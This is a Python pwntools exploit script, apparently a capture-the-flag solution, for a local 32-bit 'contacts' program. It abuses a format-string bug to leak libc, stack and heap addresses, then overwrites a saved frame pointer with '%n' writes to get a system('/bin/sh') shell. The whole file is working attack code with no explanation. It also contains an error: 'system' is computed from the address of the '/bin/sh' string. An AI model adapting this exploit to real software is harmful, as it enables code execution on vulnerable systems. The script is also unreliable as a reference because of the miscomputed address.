#!/usr/bin/env python
from pwn import *

#context.log_level = 'debug'

p = process('./contacts')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

def cmd(c):
	p.recvuntil('>>> ')
	p.sendline(str(c))

def create(name, phone, length, desc):
	cmd(1)
	p.recvuntil('Name: ')
	p.sendline(name)
	p.recvuntil('No: ')
	p.sendline(phone)
	p.recvuntil('tion: ')
	p.sendline(str(length))
	p.recvuntil('tion:\n\t\t')
	p.sendline(desc)

def remove(name):
	cmd(2)
	p.recvuntil('remove? ')
	p.sendline(name)

def edit(choice, name=None, length=None, desc=None):
	cmd(3)
	p.recvuntil('change? ')
	p.sendline(name)
	if choice == 'name':
		cmd(1)
		p.recvuntil('name: ')
		p.sendline(name)
	elif choice == 'desc':
		cmd(2)
		p.recvuntil('tion: ')
		p.sendline(str(length))
		p.recvuntil('tion:\n\t\t')
		p.sendline(desc)

def display():
	cmd(4)

def quit():
	cmd(5)

#gdb.attach(p)

payload = '%31$p'
create('1', '1', 100, payload)
display()
p.recvuntil('Description: ')
libc_start_main = int(p.recv(10)[2:], 16) - 247
libc_base = libc_start_main - libc.symbols['__libc_start_main']
info('libc_base = ' + hex(libc_base))
system = libc_base + libc.search('/bin/sh').next()
info('system = ' + hex(system))
str_bin_sh = libc_base + libc.search('/bin/sh').next()

payload = p32(system) + p32(0xcafebabe) + p32(str_bin_sh) + '%6$p' + '%11$p' + ''
create('2', '2', 100, payload)
display()
p.recvuntil('Description: ')
p.recvuntil('Description: ')
p.recvuntil('0x')
ebp_addr = int(p.recv(8), 16)
info('ebp_addr = ' + hex(ebp_addr))
p.recvuntil('0x')
heap_addr = int(p.recvuntil('\n')[:-1], 16)
info('heap_addr = ' + hex(heap_addr))

#gdb.attach(p)

part1 = (heap_addr - 4) / 2
part2 = heap_addr - part1 - 4
payload = '%{}c%{}c%6$n'.format(part1, part2)
#payload = fmtstr_payload(6, {ebp_addr:heap_addr})
print repr(payload)
create('3', '3', 100, payload)
display()
quit()

p.interactive()

